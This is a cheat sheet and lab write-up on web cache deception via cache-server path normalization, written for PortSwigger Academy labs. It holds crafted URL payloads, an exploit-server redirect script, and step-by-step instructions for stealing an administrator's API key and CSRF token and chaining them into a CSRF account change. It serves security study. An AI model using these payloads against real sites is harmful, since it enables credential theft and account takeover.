# Web cache deception — Cache server normalization

The cache decodes and resolves dot-segments (`..%2f`) that the origin server does not. An attacker crafts a URL where: the origin recognizes a delimiter (e.g. `%23`) and serves the sensitive page for the path before it; the cache normalizes the path after the delimiter to match a cacheable rule (`/resources` prefix or exact-match `/robots.txt`). Result: sensitive authenticated response cached under an attacker-reachable URL.

## Quick reference

```
# Type 4a — Cache normalization + /resources prefix rule
/my-account%23%2f%2e%2e%2fresources
   origin: %23 = delimiter -> serves /my-account (with API key)
   cache:  %23 NOT a delimiter; normalizes %2f%2e%2e%2f -> resolves to /resources prefix -> caches it
exploit: document.location = "/my-account%23%2f%2e%2e%2fresources?wcd"

# Type 4b — Cache normalization + exact-match rule (/robots.txt)
/my-account;%2f%2e%2e%2frobots.txt
   origin: ; = delimiter -> serves /my-account (with CSRF token)
   cache:  normalizes ../ -> resolves to /robots.txt -> exact-match rule -> caches it
exploit: document.location = "/my-account;%2f%2e%2e%2frobots.txt?wcd"
-> then fetch in Burp -> victim's CSRF token -> use for CSRF attack
```

## Root cause
The cache applies URL normalization (decodes `%2f`, resolves `..`) before matching against its caching rules, but the origin does not perform this normalization (or uses a different delimiter). The URL splits differently between cache (applies rule based on normalized path) and origin (serves based on pre-delimiter path = sensitive page).

## Find it
**Confirm cache normalizes:**
1. Pick a static resource, e.g. `GET /resources/image.png` → note X-Cache: miss/hit (cache has /resources rule).
2. `GET /aaa/..%2fresources/image.png` → X-Cache: miss then hit? → **cache normalizes** (resolves to /resources path).

**Confirm origin does NOT normalize:**
3. `GET /aaa/..%2fmy-account` → 404 or error (not 200)? → origin does not normalize.

**Confirm delimiter for origin:**
4. Intruder on `/my-account§§abc` with special-char list (no URL-encode) → chars returning 200.
   In Type 4a: `%23` and `%3f` are delimiters. In Type 4b: `;`.

**Combine:** use the delimiter to make origin serve `/my-account`, use encoded `..%2f` to make cache match the static rule.

**Exact-match rule discovery (Type 4b):**
5. No `/resources` directory cached. Try `GET /robots.txt` → X-Cache miss then hit → exact-match rule.
6. `GET /aaa/..%2frobots.txt` → 200 and X-Cache: miss then hit → cache normalizes to `/robots.txt`.

## Technique

### Type 4a — Cache normalization via /resources prefix
1. Intruder: `%23` and `%3f` are delimiters for origin (return 200 on `/my-account%23abc`).
2. Test each delimiter: `/my-account%23abc.js` → not cached; `/my-account%3fabc.js` → not cached. (Cache also uses these as delimiters or has no .js rule.)
3. Normalization test: `/aaa/..%2fresources/any` → X-Cache miss then hit → **cache normalizes + has /resources rule**.
4. Origin normalization: `/aaa/..%2fmy-account` → 404 → **origin does NOT normalize**.
5. Craft: `/my-account%23%2f%2e%2e%2fresources`
   - Origin: `%23` = delimiter → serves `/my-account` (API key).
   - Cache: normalizes `%2f%2e%2e%2f` → `/resources` → prefix rule → caches it.
6. Send in Repeater → 200 + X-Cache: miss. Resend → X-Cache: hit. Confirmed.
7. Exploit server: `<script>document.location="https://LAB.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>`
8. Deliver to victim → fetch URL in Burp → victim's API key.

### Type 4b — Cache normalization via exact-match rule (chains to CSRF)
1. Intruder → `;` and `?` are delimiters for origin.
2. No `/resources` static directory cached. `GET /robots.txt` → X-Cache miss then hit (exact-match rule).
3. `GET /aaa/..%2frobots.txt` → 200 + X-Cache: miss then hit → cache normalizes to `/robots.txt`.
4. Craft: `/my-account;%2f%2e%2e%2frobots.txt`
   - Origin: `;` = delimiter → serves `/my-account` (contains CSRF token in form).
   - Cache: normalizes `%2f%2e%2e%2f` → `/robots.txt` → exact-match rule → caches it.
5. Send → 200 + X-Cache: miss then hit. Confirmed.
6. Exploit server: `<script>document.location="https://LAB.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>`
7. Deliver to victim.
8. **Fetch in Burp** (not browser — browser may redirect on invalid session): `GET /my-account;%2f%2e%2e%2frobots.txt?wcd` → response contains victim's (administrator's) CSRF token.
9. In proxy history, find `POST /my-account/change-email` → Send to Repeater.
10. Replace CSRF token with stolen token. Change email. OR use Burp "Generate CSRF PoC" and deliver.

## Payload arsenal
```
# Cache normalization discovery
GET /aaa/..%2fresources/image.png     -> X-Cache: miss->hit = cache normalizes /resources prefix
GET /aaa/..%2frobots.txt              -> X-Cache: miss->hit = cache normalizes /robots.txt exact-match

# Type 4a exploit
/my-account%23%2f%2e%2e%2fresources?wcd
/my-account%3f%2f%2e%2e%2fresources?wcd   (if %3f is delimiter and not recognized by cache)

# Type 4b exploit
/my-account;%2f%2e%2e%2frobots.txt?wcd

# Exploit delivery
<script>document.location="https://LAB.web-security-academy.net/CRAFTED-URL?wcd=UNIQUE"</script>

# Fetch victim's token in Burp (bypass browser redirect)
GET /my-account;%2f%2e%2e%2frobots.txt?wcd  (with victim's session — already cached, any cookie returns same cached response)
```

## Bypasses
| Issue | Fix |
|---|---|
| Browser redirects when fetching cached URL | Use Burp Repeater to fetch (not browser) |
| Cache expired (30s max-age) | Resend exploit with new cache buster, fetch within 30s |
| %23 recognized as delimiter by cache too | Try %3f; or use exact-match rule path instead of /resources |
| No exact-match rule found | Try /sitemap.xml, /favicon.ico, /index.html, /crossdomain.xml |

## Exploitation walkthrough
**Type 4a (cache normalization, API key):**
1. Intruder → `%23` and `%3f` are delimiters. None cache `.js` extension.
2. `/aaa/..%2fresources/X` = X-Cache miss→hit (cache normalizes, /resources rule).
3. `/aaa/..%2fmy-account` = 404 (origin doesn't normalize).
4. `/my-account%23%2f%2e%2e%2fresources?wcd` = 200 + X-Cache miss→hit.
5. Deliver to victim → fetch → Carlos's API key → submit.

**Type 4b (exact-match, CSRF token):**
1. Intruder → `;` delimiter. No /resources rule. `/robots.txt` = X-Cache hit.
2. `/aaa/..%2frobots.txt` = X-Cache hit (cache normalizes).
3. `/my-account;%2f%2e%2e%2frobots.txt?wcd` = 200 + X-Cache miss→hit.
4. Deliver to victim. Fetch in Burp → administrator's CSRF token in form.
5. POST /my-account/change-email with admin's CSRF token → change email → lab solved.

## Chaining
- Type 4b is a direct chain: **WCD → CSRF token steal → [CSRF](../../CSRF/) attack** bypassing anti-CSRF defenses.
- API key from WCD → [Authentication](../../Authentication/) bypass (use as direct credential).
- WCD typically enables escalation to admin account → then [Access-control](../../Access-control/).

## Tools
- **Burp Repeater** — test normalization payloads, verify X-Cache miss→hit sequence
- **Burp Intruder** — Sniper, special-char payload list, "Deselect URL-encode these characters"
- **Burp "Generate CSRF PoC"** — once CSRF token is stolen, generate HTML PoC
- **Exploit server** — deliver `document.location` redirect to victim

## Labs

### Exploiting cache server normalization for web cache deception [Practitioner]
`%23`/`%3f` are origin delimiters. None cached as `.js`. `/aaa/..%2fresources/X` = X-Cache miss→hit (cache normalizes). `/my-account%23%2f%2e%2e%2fresources?wcd` = 200 + cached. Deliver to victim → API key. Key insight: cache normalizes encoded dot-segment; origin interprets `%23` as path delimiter.

### Exploiting exact-match cache rules for web cache deception [Expert]
`;` is origin delimiter. No /resources rule. `/robots.txt` exact-match rule; cache normalizes `..%2f`. `/my-account;%2f%2e%2e%2frobots.txt?wcd` = 200 + cached. Deliver to victim; fetch in Burp → admin's CSRF token → change admin's email via CSRF. Key insight: chains WCD (exact-match normalization) + CSRF token steal → CSRF attack against admin.

## Real-world notes
- Fetch the cached response in Burp, not the browser — browsers follow redirects (to login page) when session is invalid; Burp sends as-is and gets the cached content.
- Exact-match rules (`/robots.txt`, `/favicon.ico`) are often overlooked vs extension and prefix rules but are exploitable with cache-normalization.
- Always include a unique `?cachebust=N` parameter when delivering to victim to avoid serving a stale response from your own testing.

## References
- https://portswigger.net/web-security/web-cache-deception
